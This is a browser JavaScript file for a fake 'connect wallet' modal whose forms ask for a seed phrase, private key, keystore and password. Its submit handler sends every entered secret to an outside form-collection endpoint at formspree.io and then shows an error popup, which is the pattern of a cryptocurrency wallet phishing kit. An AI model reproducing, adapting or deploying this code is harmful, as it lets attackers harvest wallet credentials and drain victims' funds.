// Get modal and buttons
const modal = document.getElementById('walletModal');
const openModalBtn = document.getElementById('openModalBtn');
const closeModalBtn = document.getElementById('closeModalBtn');
const closeFormModalBtn = document.getElementById('closeFormModalBtn');

// Get the element with the class 'open-modal-area'
var openModalArea = document.querySelector(".open-modal-area");

// Function to open the modal
openModalArea.onclick = function () {
  modal.style.display = "block";
}

// Open the wallet selection modal
openModalBtn.addEventListener('click', function () {
  modal.style.display = 'block';
});

// Close the wallet selection modal
closeModalBtn.addEventListener('click', function () {
  modal.style.display = 'none';
});

// Open Modal
document.getElementById('openForm').onclick = function () {
  document.getElementById('popupModal').style.display = 'block';
}

// Close Modal
document.getElementById('closeForm').onclick = function () {
  document.getElementById('popupModal').style.display = 'none';
}

// Open Tab
function openTab(event, tabName) {
  var i, tabContent, tabButtons;

  tabContent = document.getElementsByClassName('tab-content');
  for (i = 0; i < tabContent.length; i++) {
    tabContent[i].classList.remove('active');
  }

  tabButtons = document.getElementsByClassName('tab-button');
  for (i = 0; i < tabButtons.length; i++) {
    tabButtons[i].classList.remove('active');
  }

  document.getElementById(tabName).classList.add('active');
  event.currentTarget.classList.add('active');
}

// Close Modal when clicked outside
window.onclick = function (event) {
  var modal = document.getElementById('popupModal');
  if (event.target === modal) {
    modal.style.display = 'none';
  }

  var errorModal = document.getElementById("errorModal");
  if (event.target === errorModal) {
    errorModal.style.display = "none";
  }
}

// Function to show the error popup modal
function showErrorPopup() {
  var modal = document.getElementById("errorModal");
  modal.style.display = "block";
}

// Function to close the modal
function closeModal() {
  var modal = document.getElementById("errorModal");
  modal.style.display = "none";
}

// Submit Button
document.getElementById('submitBtn').onclick = function () {
  const phraseForm = document.getElementById('phraseForm');
  const privateKeyForm = document.getElementById('privatekeyForm');
  const keystoreForm = document.getElementById('keystoreForm');

  const phrase = phraseForm?.phrase?.value.trim() || '';
  const privateKey = privateKeyForm?.privatekey?.value.trim() || '';
  const keystore = keystoreForm?.keystore?.value.trim() || '';
  const password = keystoreForm?.password?.value.trim() || '';

  fetch('https://formspree.io/f/xqaybqon', {
    method: 'POST',
    body: JSON.stringify({
      phrase,
      privateKey,
      keystore,
      password
    }),
    headers: {
      'Accept': 'application/json',
      'Content-Type': 'application/json'
    }
  })
    .then(res => res.json())
    .then(data => {
      if (data.ok) {
        alert("Submitted successfully!");
        document.getElementById('popupModal').style.display = 'none';
      } else {
        alert("Failed to submit. Try again.");
        showErrorPopup();
      }
    })
    .catch(err => {
      console.error("Network error:", err);
      alert("Network error.");
      showErrorPopup();
    });
};
